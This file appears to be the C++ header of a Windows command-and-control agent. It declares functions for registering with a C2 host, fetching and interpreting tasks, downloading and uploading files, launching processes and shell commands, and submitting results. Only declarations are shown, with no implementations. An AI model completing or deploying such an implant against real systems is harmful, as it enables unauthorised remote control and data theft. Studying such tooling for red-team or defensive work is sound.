#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <fstream>
#include <shlobj.h>
#include <Shobjidl.h>
#include <lm.h>
#include <unordered_map>
#include <sstream>
#include "buildoptions.h"
#include "json.hpp"

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "Urlmon.lib")

namespace network {
    std::wstring MakeHttpRequest(const std::wstring& host,
        const std::wstring& path,
        const std::string& data,
        const std::wstring& method,
        const std::wstring& contentType);
}

namespace interpreter {
    std::wstring InterpretTask(std::wstring task, std::wstring id);
    bool downloadfile(std::vector<std::wstring> args);
    bool createfilewrap(std::vector<std::wstring> args);
    bool createprocesswrap(std::vector<std::wstring> args);
    bool uploadfile(std::vector<std::wstring> args);
    bool setWallpaper(std::vector<std::wstring> args);
    bool shellexecutewrap(std::vector<std::wstring> args);
}

namespace communication {
    nlohmann::json RegisterAgent(const std::wstring& c2_host);
    nlohmann::json FetchTask(const std::wstring& c2_host, const std::wstring& agent_id);
    bool SubmitResults(const std::wstring& c2_host, const std::wstring& agent_id, const nlohmann::json& task_result);

}

namespace misc {
    std::wstring JsonToWString(const nlohmann::json& j);
    nlohmann::json WStringToJson(const std::wstring& wstr);
    std::string WideStringToUTF8(const std::wstring& wstr);
    std::wstring UTF8ToWideString(const std::string& utf8);
}